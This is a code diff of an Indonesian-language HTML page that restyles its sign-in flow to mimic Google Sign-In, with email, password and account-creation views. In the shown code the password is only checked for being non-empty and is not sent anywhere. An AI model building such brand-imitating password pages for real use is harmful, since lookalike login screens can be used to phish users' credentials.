-            renderView();
-        }
-
-        function escapeHtml(text) {
-            const div = document.createElement('div');
-            div.textContent = text;
-            return div.innerHTML;
-        }
-
-        function renderView() {
-            const accounts = getDeviceAccounts();
-            const sectionList = document.getElementById('section-account-list');
-            const sectionForm = document.getElementById('section-account-form');
-            const headerTitle = document.getElementById('header-title');
-            const headerSubtitle = document.getElementById('header-subtitle');
-            const btnCancel = document.getElementById('btn-form-cancel');
-
-            if (accounts.length > 0 && !isExplicitAddMode) {
-                // Tampilkan Daftar Akun yang ada di perangkat ini
-                sectionList.style.display = 'block';
-                sectionForm.style.display = 'none';
-                headerTitle.textContent = 'Pilih akun';
-                headerSubtitle.innerHTML = `untuk melanjutkan ke <b style="color:#ffffff;">${displayHost}</b>`;
-
-                const list = document.getElementById('account-list');
-                list.innerHTML = '';
-
-                accounts.forEach((acc, idx) => {
-                    const li = document.createElement('li');
+                accounts.forEach(function(acc) {
+                    var li = document.createElement('li');
                     li.className = 'account-item';
-                    li.innerHTML = `
-                        <div class="avatar" style="background-color: ${acc.color || '#4285f4'};">${escapeHtml(acc.initial || acc.name.charAt(0).toUpperCase())}</div>
-                        <div class="account-info">
-                            <div class="account-name">${escapeHtml(acc.name)}</div>
-                            <div class="account-email">${escapeHtml(acc.email)}</div>
-                        </div>
-                        <button type="button" class="btn-remove-acc" title="Hapus dari perangkat ini" aria-label="Hapus">&times;</button>
-                    `;
-                    li.addEventListener('click', () => selectAccount(acc));
-                    li.querySelector('.btn-remove-acc').addEventListener('click', (e) => removeAccount(idx, e));
-                    list.appendChild(li);
+                    var init = (acc.initial || (acc.name || acc.email || 'G').charAt(0)).toUpperCase();
+                    li.innerHTML =
+                        '<div class="account-avatar" style="background-color:' + escapeHtml(acc.color || '#4285f4') + ';">' + escapeHtml(init) + '</div>' +
+                        '<div class="account-details">' +
+                            '<div class="account-name">' + escapeHtml(acc.name) + '</div>' +
+                            '<div class="account-email">' + escapeHtml(acc.email) + '</div>' +
+                        '</div>';
+                    li.addEventListener('click', function() {
+                        completeLogin(acc);
+                    });
+                    listEl.appendChild(li);
                 });
-            } else {
-                // Tampilkan Form Masuk / Tambah Akun (jika belum ada akun sama sekali atau klik Gunakan akun lain)
-                sectionList.style.display = 'none';
-                sectionForm.style.display = 'block';
-                headerTitle.textContent = 'Login';
-                headerSubtitle.innerHTML = `Lanjutkan ke <b style="color:#ffffff;">${displayHost}</b>`;
+            }
 
-                if (accounts.length > 0) {
-                    btnCancel.textContent = 'Kembali ke daftar akun';
-                } else {
-                    btnCancel.textContent = 'Kembali ke Beranda';
+            function showEmailView() {
+                hideAllViews();
+                viewTitle.textContent = 'Login';
+                viewSubtitle.innerHTML = 'Lanjutkan ke <span class="domain-link">' + escapeHtml(host) + '</span>';
+                viewEmail.style.display = 'block';
+                document.getElementById('email-field-wrap').classList.remove('error');
+                setTimeout(function() {
+                    document.getElementById('input-email').focus();
+                }, 50);
+            }
+
+            function showPasswordView(email) {
+                pendingEmail = email;
+                hideAllViews();
+                viewTitle.textContent = 'Selamat datang';
+                viewSubtitle.style.display = 'none';
+                chipEmailText.textContent = email;
+                userChip.style.display = 'inline-flex';
+                viewPassword.style.display = 'block';
+                document.getElementById('password-field-wrap').classList.remove('error');
+                document.getElementById('input-password').value = '';
+                setTimeout(function() {
+                    document.getElementById('input-password').focus();
+                }, 50);
+            }
+
+            function showNameView() {
+                hideAllViews();
+                viewTitle.textContent = 'Buat Akun Google';
+                viewSubtitle.textContent = 'Masukkan nama Anda';
+                viewName.style.display = 'block';
+                document.getElementById('name-field-wrap').classList.remove('error');
+                setTimeout(function() {
+                    document.getElementById('input-first-name').focus();
+                }, 50);
+            }
+
+            // Events
+            document.getElementById('btn-use-another').addEventListener('click', function() {
+                withLoading(showEmailView);
+            });
+
+            userChip.addEventListener('click', function() {
+                withLoading(function() {
+                    if (getDeviceAccounts().length > 0) {
+                        showChooserView();
+                    } else {
+                        showEmailView();
+                    }
+                });
+            });
+
+            document.getElementById('btn-create-account').addEventListener('click', function() {
+                withLoading(showNameView);
+            });
+
+            document.getElementById('btn-back-from-name').addEventListener('click', function() {
+                withLoading(showEmailView);
+            });
+
+            document.getElementById('view-name').addEventListener('submit', function(e) {
+                e.preventDefault();
+                var fn = document.getElementById('input-first-name').value.trim();
+                var ln = document.getElementById('input-last-name').value.trim();
+                if (!fn) {
+                    document.getElementById('name-field-wrap').classList.add('error');
+                    return;
                 }
+                pendingCustomName = fn + (ln ? ' ' + ln : '');
+                withLoading(showEmailView);
+            });
 
-                setTimeout(() => {
-                    const emailInput = document.getElementById('input-email');
-                    if (emailInput) emailInput.focus();
-                }, 100);
-            }
-        }
+            document.getElementById('view-email').addEventListener('submit', function(e) {
+                e.preventDefault();
+                var raw = document.getElementById('input-email').value.trim();
+                var wrap = document.getElementById('email-field-wrap');
+                if (!raw) {
+                    wrap.classList.add('error');
+                    document.getElementById('email-error-text').textContent = 'Masukkan email atau nomor telepon';
+                    return;
+                }
+                // If user typed username without @, append @gmail.com just like real Google Sign-In!
+                var email = raw.includes('@') ? raw : (raw + '@gmail.com');
+                wrap.classList.remove('error');
+                withLoading(function() {
+                    showPasswordView(email);
+                });
+            });
 
-        // Tombol Gunakan Akun Lain
-        document.getElementById('btn-use-other').addEventListener('click', () => {
-            isExplicitAddMode = true;
-            renderView();
-        });
+            document.getElementById('chk-show-pass').addEventListener('change', function(e) {
+                document.getElementById('input-password').type = e.target.checked ? 'text' : 'password';
+            });
 
-        // Tombol Batal/Kembali pada Form
-        document.getElementById('btn-form-cancel').addEventListener('click', () => {
-            const accounts = getDeviceAccounts();
-            if (accounts.length > 0 && isExplicitAddMode) {
-                isExplicitAddMode = false;
-                renderView();
+            document.getElementById('view-password').addEventListener('submit', function(e) {
+                e.preventDefault();
+                var pass = document.getElementById('input-password').value;
+                var wrap = document.getElementById('password-field-wrap');
+                if (!pass) {
+                    wrap.classList.add('error');
+                    return;
+                }
+                wrap.classList.remove('error');
+
+                var accounts = getDeviceAccounts();
+                var existing = accounts.find(function(a) {
+                    return a.email.toLowerCase() === pendingEmail.toLowerCase();
+                });
+
+                var palette = ['#4285f4', '#ea4335', '#34a853', '#e91e63', '#00897b', '#0288d1', '#8e24aa', '#d81b60', '#5c6bc0'];
+                var color = (existing && existing.color) || palette[Math.floor(Math.random() * palette.length)];
+                var displayName = pendingCustomName || (existing && existing.name) || formatNameFromEmail(pendingEmail);
+                var initial = (displayName.charAt(0) || pendingEmail.charAt(0) || 'G').toUpperCase();
+
+                var acc = {
+                    name: displayName,
+                    email: pendingEmail,
+                    initial: initial,
+                    color: color
+                };
+
+                var filtered = accounts.filter(function(a) {
+                    return a.email.toLowerCase() !== pendingEmail.toLowerCase();
+                });
+                filtered.unshift(acc);
+                saveDeviceAccounts(filtered);
+
+                completeLogin(acc);
+            });
+
+            // Initial View
+            var existingAccounts = getDeviceAccounts();
+            if (existingAccounts.length > 0 && !forceAdd) {
+                showChooserView();
             } else {
-                window.location.href = '/';
+                showEmailView();
             }
-        });
-
-        // Submit Form Akun Baru
-        document.getElementById('form-add-account').addEventListener('submit', (e) => {
-            e.preventDefault();
-            const email = document.getElementById('input-email').value.trim();
-            const name = document.getElementById('input-name').value.trim();
-
-            if (!email || !email.includes('@')) {
-                alert('Silakan masukkan alamat email yang valid.');
-                return;
-            }
-
-            const displayName = name || email.split('@')[0];
-            const initial = (displayName.charAt(0) || email.charAt(0)).toUpperCase();
-            const colors = ["#4285f4", "#ea4335", "#fbbc05", "#34a853", "#e91e63", "#00897b", "#0288d1", "#8e24aa", "#d81b60", "#607d8b"];
-            const randomColor = colors[Math.floor(Math.random() * colors.length)];
-
-            const newAcc = {
-                name: displayName,
-                email: email,
-                initial: initial,
-                color: randomColor
-            };
-
-            const accounts = getDeviceAccounts();
-            const existingIdx = accounts.findIndex(a => a.email.toLowerCase() === email.toLowerCase());
-            if (existingIdx !== -1) {
-                accounts[existingIdx] = newAcc;
-            } else {
-                accounts.unshift(newAcc);
-            }
-
-            saveDeviceAccounts(accounts);
-            selectAccount(newAcc);
-        });
-
-        // Inisialisasi tampilan
-        renderView();
+        })();
     </script>
 </body>
 </html>
